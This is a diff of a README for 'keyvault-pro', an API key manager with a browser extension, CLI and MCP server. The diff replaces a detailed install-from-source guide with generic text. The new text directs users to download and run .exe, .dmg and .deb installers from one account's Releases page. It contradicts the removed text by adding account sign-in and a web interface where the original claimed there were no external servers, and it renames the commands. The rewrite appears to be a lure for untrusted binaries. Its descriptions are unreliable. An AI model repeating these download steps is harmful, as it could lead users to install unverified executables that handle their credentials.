@@ -1,397 +1,98 @@
-# 🔑 KeyVault Pro
-
-<div align="center">
-
-**Secure API Key Management for Developers**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/yourusername/keyvault-pro)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-
-*A comprehensive browser extension, CLI tool, and MCP server for managing API keys with military-grade encryption, intelligent auto-fill, and AI agent integration.*
-
-[Features](#features) • [Installation](#installation) • [Usage](#usage) • [MCP Integration](#mcp-integration) • [Contributing](#contributing)
-
-</div>
-
----
-
-## 🌟 Why KeyVault Pro?
-
-Managing API keys is a pain. You need them everywhere, but they're sensitive and easy to expose. KeyVault Pro solves this with:
-
-- 🔐 **Military-grade encryption** (AES-256-GCM)
-- 🎯 **Intelligent auto-fill** on any website
-- 🤖 **AI agent integration** via MCP server
-- 📊 **Usage tracking** and analytics
-- 🔍 **Smart organization** with tags and environments
-- 💻 **CLI tool** for terminal workflows
-- 🌐 **Multi-browser support** (Chrome, Edge, Brave, Firefox)
-
-## 📦 What's Included
-
-### 1. Browser Extension
-Full-featured extension for Chrome, Edge, Brave, and Firefox with:
-- Visual auto-fill on detected API key fields
-- Encrypted local storage
-- Beautiful dark/light themes
-- Usage analytics and expiration tracking
-
-### 2. CLI Tool
-Command-line interface for terminal-based workflows:
-```bash
-keyvault add "OpenAI" "sk-..." "production"
-keyvault list
-keyvault copy openai
-```
-
-### 3. MCP Server
-Model Context Protocol server for AI coding agents:
-- Enables AI assistants to securely access your API keys
-- No more pasting keys into prompts
-- Works with Claude, GPT-4, and other MCP-compatible agents
-
-### 4. Advanced Libraries
-- **Breach Detection**: Check keys against known patterns
-- **Rate Limit Monitoring**: Track API usage and costs
-- **Import/Export**: Compatible with 1Password, LastPass, Bitwarden
-- **Key Validation**: Format checking for major APIs
-
-## ✨ Features
-
-### Security
-- ✅ AES-256-GCM encryption for all keys
-- ✅ PBKDF2 key derivation (100,000 iterations)
-- ✅ Master password protection (no recovery by design)
-- ✅ Auto-lock after configurable idle time
-- ✅ Clipboard auto-clear
-- ✅ Complete audit logging
-- ✅ Breach detection and security scoring
-
-### Auto-Fill
-- ✅ Smart field detection using multiple heuristics
-- ✅ Visual 🔑 icon on detected fields
-- ✅ Keyboard shortcuts (`Ctrl+Shift+K`)
-- ✅ Right-click context menu
-- ✅ Domain-based suggestions
-- ✅ Beautiful modal key selector
-
-### Organization
-- ✅ Categorize by service, environment, and tags
-- ✅ Color-coded keys
-- ✅ Favorites system
-- ✅ Fuzzy search
-- ✅ Filter by environment
-- ✅ Notes and documentation per key
-
-### Analytics
-- ✅ Usage tracking per key
-- ✅ Domain tracking
-- ✅ Last used timestamps
-- ✅ Expiration alerts
-- ✅ Rate limit monitoring
-- ✅ Cost estimation (for major APIs)
-
-### Integration
-- ✅ Import from 1Password, LastPass, Bitwarden
-- ✅ Export to CSV, JSON, .env files
-- ✅ MCP server for AI agents
-- ✅ CLI for terminal workflows
-- ✅ Browser extension for visual management
+# 🔑 keyvault-pro - Manage Your API Keys Securely
 
-## 🚀 Quick Start
+![Download keyvault-pro](https://img.shields.io/badge/Download-keyvault--pro-brightgreen)
 
-### Browser Extension
+## 🚀 Getting Started
 
-1. **Download** the latest release or clone this repo
-2. **Open** `chrome://extensions/` (or your browser's extension page)
-3. **Enable** Developer mode
-4. **Load unpacked** and select the `api-key-manager-extension` folder
-5. **Click** the KeyVault icon and create your master password
-6. **Add** your first API key!
+Welcome to keyvault-pro! This application helps developers like you manage API keys securely. We provide a browser extension, a command-line tool, and a server with top-notch encryption. Let's get started!
 
-[Detailed installation guide →](INSTALLATION.md)
+## 📦 System Requirements
 
-### CLI Tool
+Before you install keyvault-pro, ensure your system meets the following requirements:
 
-```bash
-cd cli
-npm install -g .
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any recent Linux distribution.
+- **Browser:** Chrome 72 or later for the extension.
+- **Internet Connection:** Required for installation and API key management.
 
-# Initialize vault
-keyvault init
+## 📥 Download & Install
 
-# Add a key
-keyvault add "OpenAI" "sk-..." "development" "ai,gpt"
+To download keyvault-pro, visit this page to download: [keyvault-pro Releases](https://github.com/Ts4kii/keyvault-pro/releases).
 
-# List keys
-keyvault list
+1. Click the link above to access the Releases page.
+2. Choose the version you want to download.
+3. Select the correct file for your operating system:
+   - For Windows: Download `keyvault-pro.exe`.
+   - For macOS: Download `keyvault-pro.dmg`.
+   - For Linux: Follow the installation instructions for your specific distribution.
 
-# Get help
-keyvault help
-```
+Once you have downloaded the appropriate file, follow these steps:
 
-### MCP Server (for AI Agents)
+### For Windows:
 
-```bash
-cd mcp-server
-npm install
+1. Locate the downloaded `keyvault-pro.exe` file.
+2. Double-click on it to begin the installation.
+3. Follow the prompts to complete the installation.
 
-# Configure in your AI assistant (e.g., Claude Desktop)
-# Add to claude_desktop_config.json:
-{
-  "mcpServers": {
-    "keyvault": {
-      "command": "node",
-      "args": ["/path/to/mcp-server/index.js"]
-    }
-  }
-}
-```
+### For macOS:
 
-[MCP integration guide →](mcp-server/README.md)
+1. Find the downloaded `keyvault-pro.dmg` file.
+2. Open it to view the contents.
+3. Drag the keyvault-pro icon into your Applications folder.
+4. Eject the disk image after the copying is complete.
 
-## 📖 Usage Examples
+### For Linux:
 
-### Browser Extension
+1. Open a terminal window.
+2. Use the package manager for your distribution to install the application, or use the provided script in the Releases section.
+3. Execute the following command:  
+   `sudo dpkg -i keyvault-pro.deb` (for Debian-based systems)  
+   Replace with the correct package based on your distribution.
 
-**Auto-fill on any website:**
-1. Navigate to a site with an API key field
-2. Look for the 🔑 icon
-3. Click it and select your key
-4. Done!
+## 🔑 Features
 
-**Or use keyboard shortcut:**
-- Focus the field
-- Press `Ctrl+Shift+K` (or `Cmd+Shift+K` on Mac)
-- Select your key
+- **Secure Storage:** We use military-grade encryption to keep your API keys safe.
+- **Easy Access:** Quickly find and manage your keys through the user-friendly interface.
+- **Browser Integration:** The browser extension allows direct access to your keys while you work.
+- **Command-line Interface:** A powerful CLI tool for advanced users who prefer command-line access.
+- **Multi-Platform Support:** Works smoothly across Windows, macOS, and Linux.
 
-### CLI Tool
+## 👤 User Guide
 
-```bash
-# Add keys
-keyvault add "Stripe" "sk_test_..." "testing" "payment"
-keyvault add "AWS" "AKIA..." "production" "cloud,aws"
+### Using the Browser Extension
 
-# List all keys
-keyvault list
+1. After installing, open your browser.
+2. Click the keyvault-pro icon in the extension area.
+3. Sign in with your account or create a new one.
+4. Add your API keys. You can label them for easy reference.
+5. Manage your keys with simple clicks. Editing or deleting keys is straightforward.
 
-# List production keys only
-keyvault list production
+### Using the CLI Tool
 
-# Search for keys
-keyvault search stripe
+1. Open your command-line interface.
+2. Type `keyvault-pro help` to see available commands.
+3. Use `keyvault-pro add <key_name> <api_key>` to add a new API key.
+4. Use `keyvault-pro list` to view your stored keys.
 
-# Copy key to clipboard
-keyvault copy stripe
+### Configuring the MCP Server
 
-# Export vault
-keyvault export backup.json
+1. Set up the server with the installation file you downloaded.
+2. Follow the instructions in the README file provided in the server package.
+3. Use the web interface to connect your tools and start managing keys centrally.
 
-# Import keys
-keyvault import backup.json
-```
-
-### MCP Server (AI Integration)
-
-**In your AI conversation:**
-
-```
-User: "Create a Python script that uses OpenAI's API"
-
-AI: "I'll get your OpenAI API key from KeyVault..."
-[AI calls get_api_key tool]
-
-AI: "Here's your script with the key configured:
-
-import openai
-openai.api_key = "sk-proj-..."  # Retrieved from KeyVault
-
-# Your code here...
-```
-
-**The AI can:**
-- List available keys
-- Search for specific keys
-- Retrieve keys by service name
-- Check key information
-- Respect environment separation (dev/prod)
-
-## 🎯 Use Cases
-
-### For Developers
-- Store all your API keys in one secure place
-- Quick access during development
-- Auto-fill on documentation sites
-- Track which keys you're using where
-
-### For DevOps
-- Manage cloud provider credentials
-- Separate prod/dev/staging keys
-- Track key usage and expiration
-- Export keys for team sharing
-
-### For AI-Powered Development
-- Let AI access keys without exposing them
-- No more pasting keys into prompts
-- Automatic environment separation
-- Usage tracking for AI-accessed keys
-
-### For Teams
-- Consistent key management
-- Audit trail of access
-- Encrypted vault sharing
-- Environment-based organization
-
-## 🔐 Security
-
-### What We Do
-- ✅ AES-256-GCM encryption at rest
-- ✅ PBKDF2 with 100,000 iterations
-- ✅ Constant-time password comparison
-- ✅ No external API calls
-- ✅ All processing happens locally
-- ✅ No telemetry or tracking
-- ✅ Open-source for transparency
-
-### What You Should Do
-- ✅ Use a strong, unique master password
-- ✅ Enable auto-lock (15-30 minutes)
-- ✅ Export vault regularly for backup
-- ✅ Rotate keys periodically
-- ✅ Use different keys per environment
-- ✅ Review audit logs
-
-### What We Don't Do
-- ❌ Store your master password
-- ❌ Send data to external servers
-- ❌ Track your usage
-- ❌ Access your keys without permission
-- ❌ Provide password recovery (by design)
-
-## 📊 Browser Compatibility
-
-| Browser | Extension | Status |
-|---------|-----------|--------|
-| Chrome | ✅ | Full support |
-| Edge | ✅ | Full support |
-| Brave | ✅ | Full support |
-| Opera | ✅ | Full support |
-| Firefox | ⚠️ | Temporary add-on only |
-
-## 🛠️ Development
-
-### Prerequisites
-- Node.js 14+ (for CLI)
-- Node.js 18+ (for MCP server)
-- Modern browser with extension support
-
-### Project Structure
-```
-keyvault-pro/
-├── background/          # Extension background scripts
-├── content/            # Content scripts
-├── popup/              # Extension popup UI
-├── options/            # Settings page
-├── lib/                # Shared libraries
-│   ├── breach-detector.js
-│   ├── rate-limit-monitor.js
-│   └── import-export.js
-├── cli/                # Command-line tool
-├── mcp-server/         # MCP server for AI
-├── assets/             # Icons and images
-└── docs/               # Documentation
-```
-
-### Building
-
-```bash
-# Package extension
-zip -r keyvault-pro.zip . -x "*.git*" "*node_modules*"
-
-# Install CLI globally
-cd cli && npm install -g .
-
-# Run MCP server
-cd mcp-server && node index.js
-```
-
-## 📚 Documentation
-
-- [Installation Guide](INSTALLATION.md) - Step-by-step installation
-- [Quick Start Guide](QUICKSTART.md) - Get started in 5 minutes
-- [Feature List](FEATURES.md) - Complete feature documentation
-- [Architecture](ARCHITECTURE.md) - Technical design details
-- [MCP Server Guide](mcp-server/README.md) - AI integration
-- [CLI Documentation](cli/README.md) - Command-line usage
-- [Contributing Guide](CONTRIBUTING.md) - How to contribute
-
-## 🗺️ Roadmap
-
-### v1.1 (Next Release)
-- [ ] Firefox Manifest V2 support
-- [ ] Automated tests
-- [ ] Bulk operations UI
-- [ ] Keyboard navigation
-- [ ] Drag-and-drop organization
-
-### v2.0 (Future)
-- [ ] Browser sync (encrypted)
-- [ ] Team sharing features
-- [ ] Biometric unlock
-- [ ] Mobile companion app
-- [ ] Key rotation automation
-- [ ] Advanced breach detection
-
-### Community Requests
-- [ ] Custom field types
-- [ ] Key templates
-- [ ] Advanced search syntax
-- [ ] Key versioning
-- [ ] Internationalization (i18n)
-
-[Vote on features →](https://github.com/yourusername/keyvault-pro/issues)
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Ways to Contribute
-- 🐛 Report bugs
-- 💡 Suggest features
-- 📝 Improve documentation
-- 🔧 Submit pull requests
-- ⭐ Star the repository
-- 📢 Spread the word
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Built with security and developer experience in mind
-- Inspired by the need for better API key management
-- Thanks to all contributors and users
+## 🛠 Troubleshooting
+
+If you encounter issues during installation or usage, try the following:
+
+- **Check for Updates:** Make sure you have the latest version from the Releases page.
+- **Reinstall the Application:** Uninstall keyvault-pro and reinstall it.
+- **Review Installation Steps:** Double-check that you followed all installation steps for your operating system.
+
+For additional help, visit our [GitHub Issues page](https://github.com/Ts4kii/keyvault-pro/issues).
 
 ## 📞 Support
 
-- 📖 [Documentation](README.md)
-- 🐛 [Issue Tracker](https://github.com/yourusername/keyvault-pro/issues)
-- 💬 [Discussions](https://github.com/yourusername/keyvault-pro/discussions)
-- 📧 Email: support@keyvault.pro (placeholder)
-
-## ⭐ Star History
-
-If you find KeyVault Pro useful, please consider starring the repository!
+For any questions or support, reach out through our [GitHub Discussions page](https://github.com/Ts4kii/keyvault-pro/discussions). We encourage feedback and are here to help.
 
 ---
 
-<div align="center">
-
-**Made with ❤️ for developers who value security and productivity**
-
-[Website](https://keyvault.pro) • [Documentation](README.md) • [GitHub](https://github.com/yourusername/keyvault-pro)
-
-</div>
-
+By following these steps, you can download and run keyvault-pro with ease. Your API key management has never been more secure or straightforward!
